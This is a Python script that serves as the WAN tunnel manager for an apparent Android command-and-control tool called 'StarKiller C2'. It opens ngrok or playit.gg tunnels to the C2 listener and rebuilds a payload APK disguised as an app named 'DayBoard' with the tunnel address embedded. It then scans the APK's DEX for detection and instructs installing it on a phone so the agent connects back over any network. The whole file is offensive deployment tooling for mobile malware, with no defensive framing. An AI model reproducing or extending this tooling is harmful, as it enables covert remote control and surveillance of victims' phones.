"""
WAN tunnel manager for StarKiller C2.

Modes
-----
ngrok (default)
    Auto-starts ngrok, reads address from localhost:4040 API, rebuilds APK.
    Address changes on every ngrok restart -- rebuild each time.
    ngrok must be in PATH (installed).

playit
    Downloads playit.exe to tools/ on first run.
    Starts it silently, reads saved tunnel address from tools/playit_addr.txt.
    Address is PERMANENT -- set up once, never changes.

custom
    Supply any HOST:PORT directly, just rebuilds APK.

Usage
-----
    # ngrok (address changes each restart, rebuild required)
    python wan.py

    # playit first-time setup (one-time only)
    python wan.py --setup-playit

    # playit production (address is stable, no rebuild needed after setup)
    python wan.py --mode playit

    # custom tunnel (any TCP proxy)
    python wan.py --mode custom --addr myhost.com:9000

Setup flow for playit
---------------------
1. python wan.py --setup-playit
       -> downloads playit.exe to tools/
       -> starts it, browser opens to claim agent
       -> follow browser: create TCP tunnel, local port 8667
       -> copy the assigned hostname:port from dashboard
       -> press Enter when ready, type address
2. Future runs: python wan.py --mode playit
       -> starts playit.exe silently
       -> reads saved address
       -> rebuilds APK with that address
"""

import argparse
import json
import os
import shutil
import subprocess
import sys
import time
import urllib.request

C2_LOCAL_PORT = 8667
APP_NAME = "DayBoard"
SCRIPT_DIR = os.path.dirname(os.path.abspath(__file__))
TOOLS_DIR = os.path.join(SCRIPT_DIR, "tools")
PAYLOADS_DIR = os.path.join(SCRIPT_DIR, "payloads")
DESKTOP = os.path.expanduser("~/Desktop")
PLAYIT_EXE = os.path.join(TOOLS_DIR, "playit.exe")
PLAYIT_ADDR_FILE = os.path.join(TOOLS_DIR, "playit_addr.txt")

PLAYIT_RELEASES_API = (
    "https://api.github.com/repos/playit-cloud/playit-agent/releases/latest"
)
PLAYIT_ASSET_KEYWORD = "playit-windows-x86_64.exe"


def ok(msg):
    print(f"  [+] {msg}")


def warn(msg):
    print(f"  [!] {msg}")


def info(msg):
    print(f"  [.] {msg}")


# ---------------------------------------------------------------------------
# ngrok
# ---------------------------------------------------------------------------

def start_ngrok():
    ok(f"Starting ngrok TCP tunnel -> localhost:{C2_LOCAL_PORT}")
    proc = subprocess.Popen(
        ["ngrok", "tcp", str(C2_LOCAL_PORT)],
        stdout=subprocess.DEVNULL,
        stderr=subprocess.PIPE,
    )
    time.sleep(2)
    if proc.poll() is not None:
        err = proc.stderr.read().decode(errors="replace")
        warn("ngrok failed to start:")
        print(err)
        if "authentication" in err.lower() or "authtoken" in err.lower():
            print()
            print("  ngrok v3 requires a free account.")
            print("  1. Register at https://ngrok.com/")
            print("  2. Get token: https://dashboard.ngrok.com/authtokens")
            print("  3. Run: ngrok config add-authtoken <TOKEN>")
            print()
        sys.exit(1)
    return proc


def wait_ngrok_api(retries=20):
    for i in range(retries):
        try:
            with urllib.request.urlopen(
                "http://localhost:4040/api/tunnels", timeout=2
            ) as r:
                data = json.load(r)
                for t in data.get("tunnels", []):
                    if t.get("proto") == "tcp":
                        addr = t["public_url"].replace("tcp://", "")
                        host, port = addr.split(":")
                        return host, int(port)
        except Exception:
            pass
        time.sleep(1)
        info(f"waiting for ngrok API... ({i + 1}/{retries})")
    return None, None


# ---------------------------------------------------------------------------
# playit.gg
# ---------------------------------------------------------------------------

def get_playit_download_url():
    try:
        req = urllib.request.Request(
            PLAYIT_RELEASES_API,
            headers={"User-Agent": "Mozilla/5.0", "Accept": "application/vnd.github+json"},
        )
        with urllib.request.urlopen(req, timeout=10) as r:
            data = json.load(r)
        for asset in data.get("assets", []):
            if asset["name"] == PLAYIT_ASSET_KEYWORD:
                return asset["browser_download_url"], asset["name"]
    except Exception as e:
        warn(f"GitHub API error: {e}")
    return None, None


def download_playit():
    os.makedirs(TOOLS_DIR, exist_ok=True)
    info("Resolving latest playit release from GitHub API...")
    url, name = get_playit_download_url()
    if not url:
        warn("Could not resolve download URL.")
        print("  Manual download:")
        print("  https://github.com/playit-cloud/playit-agent/releases/latest")
        print(f"  Save as: {PLAYIT_EXE}")
        return False

    ok(f"Downloading {name}...")
    try:
        req = urllib.request.Request(url, headers={"User-Agent": "Mozilla/5.0"})
        with urllib.request.urlopen(req, timeout=120) as r:
            total = int(r.headers.get("Content-Length", 0))
            data = bytearray()
            chunk = 16384
            while True:
                block = r.read(chunk)
                if not block:
                    break
                data += block
                if total:
                    pct = len(data) * 100 // total
                    print(f"\r  [.] {pct:3d}%  ({len(data)//1024} KB)", end="", flush=True)
            print()
        with open(PLAYIT_EXE, "wb") as f:
            f.write(data)
        ok(f"Saved: tools/playit.exe ({len(data)//1024} KB)")
        return True
    except Exception as e:
        warn(f"Download failed: {e}")
        print(f"  Manual: {url}")
        print(f"  Save as: {PLAYIT_EXE}")
        return False


def start_playit():
    proc = subprocess.Popen(
        [PLAYIT_EXE],
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL,
        creationflags=subprocess.CREATE_NO_WINDOW if os.name == "nt" else 0,
    )
    time.sleep(2)
    if proc.poll() is not None:
        warn("playit.exe exited immediately -- check tools/playit.exe is valid")
        sys.exit(1)
    return proc


def try_playit_api():
    """
    playit-agent v0.15+ serves a local dashboard at :5959.
    Try to read the first TCP tunnel from the JSON API.
    Returns (host, port) or (None, None) if unavailable.
    """
    for attempt in range(8):
        try:
            with urllib.request.urlopen(
                "http://localhost:5959/api/tunnels", timeout=2
            ) as r:
                data = json.load(r)
                tunnels = data.get("tunnels") or data.get("data") or []
                for t in tunnels:
                    # Different playit-agent versions use different key names
                    addr = (
                        t.get("custom_domain")
                        or t.get("assigned_domain")
                        or t.get("address")
                        or t.get("public_address")
                    )
                    port = (
                        t.get("port")
                        or t.get("public_port")
                        or t.get("assigned_port")
                    )
                    if addr and port:
                        return addr, int(port)
        except Exception:
            pass
        time.sleep(1)
        info(f"waiting for playit API... ({attempt + 1}/8)")
    return None, None


def load_playit_addr():
    if os.path.exists(PLAYIT_ADDR_FILE):
        content = open(PLAYIT_ADDR_FILE).read().strip()
        if ":" in content:
            host, port_str = content.rsplit(":", 1)
            return host.strip(), int(port_str.strip())
    return None, None


def save_playit_addr(host, port):
    os.makedirs(TOOLS_DIR, exist_ok=True)
    with open(PLAYIT_ADDR_FILE, "w") as f:
        f.write(f"{host}:{port}\n")
    ok(f"Saved playit address: {host}:{port} -> {PLAYIT_ADDR_FILE}")


def setup_playit():
    """Full one-time playit setup wizard."""
    print()
    print("  +----------------------------------------+")
    print("  |  PLAYIT.GG FIRST-TIME SETUP            |")
    print("  +----------------------------------------+")
    print()

    if not os.path.exists(PLAYIT_EXE):
        if not download_playit():
            sys.exit(1)
    else:
        ok(f"playit.exe already in tools/")

    print()
    print("  Starting playit.exe for first-time claim...")
    print("  A browser window will open at https://playit.gg/claim/XXXXXX")
    print()

    proc = subprocess.Popen(
        [PLAYIT_EXE],
        creationflags=subprocess.CREATE_NEW_CONSOLE if os.name == "nt" else 0,
    )

    print("  In the browser:")
    print("  1. Sign up / log in at playit.gg")
    print("  2. Claim the agent when prompted")
    print("  3. Click 'Add Tunnel'")
    print("     -> Type: TCP")
    print("     -> Local server: 127.0.0.1")
    print(f"     -> Local port: {C2_LOCAL_PORT}")
    print("     -> Name: starkiller-c2  (or anything)")
    print("  4. Note the assigned hostname and port (e.g. abc.pkn5.at.plygg.com:12345)")
    print()

    addr = input("  Enter tunnel address (HOST:PORT): ").strip()
    if ":" not in addr:
        warn("Invalid format. Expected HOST:PORT")
        proc.terminate()
        sys.exit(1)

    host, port_str = addr.rsplit(":", 1)
    port = int(port_str.strip())
    save_playit_addr(host, port)

    print()
    ok("Setup complete.")
    print()
    print("  Future use:")
    print("    python server\\starkiller_gui.py   # start C2")
    print("    python wan.py --mode playit        # start tunnel + rebuild APK")
    print()
    print("  playit.exe is running. Close the console window when done with setup.")
    proc.wait()


# ---------------------------------------------------------------------------
# APK
# ---------------------------------------------------------------------------

def rebuild_apk(host, port):
    ok(f"Rebuilding APK -> C2 = {host}:{port}")
    result = subprocess.run(
        [sys.executable, "build.py",
         "--ip", host, "--port", str(port), "--name", APP_NAME],
        cwd=SCRIPT_DIR,
        capture_output=True,
        text=True,
        encoding="utf-8",
        errors="replace",
    )
    for line in result.stdout.splitlines():
        s = line.strip()
        if s:
            print("    " + s)
    if result.returncode != 0:
        warn("Build failed!")
        print((result.stderr or "")[-800:])
        sys.exit(1)


def scan_apk():
    apk = os.path.join(PAYLOADS_DIR, "starkiller-debug.apk")
    result = subprocess.run(
        [sys.executable, "obfuscate.py", "scan", apk],
        cwd=SCRIPT_DIR,
        capture_output=True,
        text=True,
        encoding="utf-8",
        errors="replace",
    )
    if "CLEAN" in result.stdout:
        ok("DEX scan: CLEAN")
    else:
        warn("DEX scan: WARNING")
        print(result.stdout[-400:])


def copy_apk(label):
    src = os.path.join(PAYLOADS_DIR, "starkiller-debug.apk")
    name = f"dayboard-wan-{label}.apk"
    dst = os.path.join(DESKTOP, name)
    shutil.copy2(src, dst)
    ok(f"APK on Desktop: {name}")
    return dst


# ---------------------------------------------------------------------------
# Main
# ---------------------------------------------------------------------------

def main():
    parser = argparse.ArgumentParser(description="StarKiller WAN tunnel + APK rebuild")
    parser.add_argument(
        "--mode", choices=["ngrok", "playit", "custom"], default="ngrok",
        help="Tunnel mode (default: ngrok)",
    )
    parser.add_argument(
        "--addr", default=None,
        help="Tunnel address HOST:PORT (required for custom; optional override for playit)",
    )
    parser.add_argument(
        "--setup-playit", action="store_true",
        help="One-time playit.gg setup: download exe, claim agent, save tunnel address",
    )
    args = parser.parse_args()

    if args.setup_playit:
        setup_playit()
        return

    print()
    print("  +----------------------------------+")
    print("  |  STARKILLER -- WAN TUNNEL SETUP  |")
    print("  +----------------------------------+")
    print()

    ngrok_proc = None
    playit_proc = None

    if args.mode == "ngrok":
        ngrok_proc = start_ngrok()
        host, port = wait_ngrok_api()
        if not host:
            warn("Could not read ngrok address from API -- check http://localhost:4040")
            ngrok_proc.terminate()
            sys.exit(1)
        ok(f"Tunnel live: {host}:{port}")
        label = "ngrok"

    elif args.mode == "playit":
        if not os.path.exists(PLAYIT_EXE):
            warn("tools/playit.exe not found. Run setup first:")
            print("    python wan.py --setup-playit")
            sys.exit(1)

        # If --addr supplied, use it and save it
        if args.addr:
            if ":" not in args.addr:
                warn("--addr must be HOST:PORT")
                sys.exit(1)
            h, ps = args.addr.rsplit(":", 1)
            save_playit_addr(h.strip(), int(ps.strip()))

        ok("Starting playit.exe (silent)...")
        playit_proc = start_playit()

        # Try API first, then saved file
        host, port = try_playit_api()
        if not host:
            info("playit API not available -- reading saved address")
            host, port = load_playit_addr()

        if not host:
            warn("No tunnel address available.")
            warn("Run --setup-playit first or supply --addr HOST:PORT")
            playit_proc.terminate()
            sys.exit(1)

        ok(f"Tunnel live: {host}:{port}")
        label = "playit"

    else:  # custom
        if not args.addr:
            warn("--addr required for --mode custom")
            print("  Example: --addr myhost.com:9000")
            sys.exit(1)
        if ":" not in args.addr:
            warn("--addr must be HOST:PORT")
            sys.exit(1)
        host, port_str = args.addr.rsplit(":", 1)
        host = host.strip()
        port = int(port_str.strip())
        ok(f"Using custom address: {host}:{port}")
        label = "custom"

    rebuild_apk(host, port)
    scan_apk()
    dst = copy_apk(label)

    print()
    print("  +------------------------------------------------------+")
    print(f"  |  C2 HOST : {host}")
    print(f"  |  C2 PORT : {port}")
    print(f"  |  APK     : {os.path.basename(dst)}")
    print("  +------------------------------------------------------+")
    print("  |  1. python server\\starkiller_gui.py")
    print("  |  2. Install APK on phone (any network: 4G/5G/WAN)")
    print("  |  3. Agent connects via tunnel")
    if args.mode == "ngrok":
        print("  |")
        print("  |  NOTE: ngrok address changes on restart -- rebuild each time")
        print("  |  For persistent address: python wan.py --setup-playit")
    elif args.mode == "playit":
        print("  |")
        print("  |  Address is PERMANENT -- no rebuild needed on future runs")
        print("  |  Just start: python wan.py --mode playit")
    print("  +------------------------------------------------------+")
    print()

    if args.mode == "ngrok" and ngrok_proc:
        print("  ngrok running. Keep this terminal open. Ctrl+C to stop.\n")
        try:
            ngrok_proc.wait()
        except KeyboardInterrupt:
            ngrok_proc.terminate()
            ok("ngrok stopped.")

    elif args.mode == "playit" and playit_proc:
        print("  playit running. Keep this terminal open. Ctrl+C to stop.\n")
        try:
            playit_proc.wait()
        except KeyboardInterrupt:
            playit_proc.terminate()
            ok("playit stopped.")


if __name__ == "__main__":
    main()
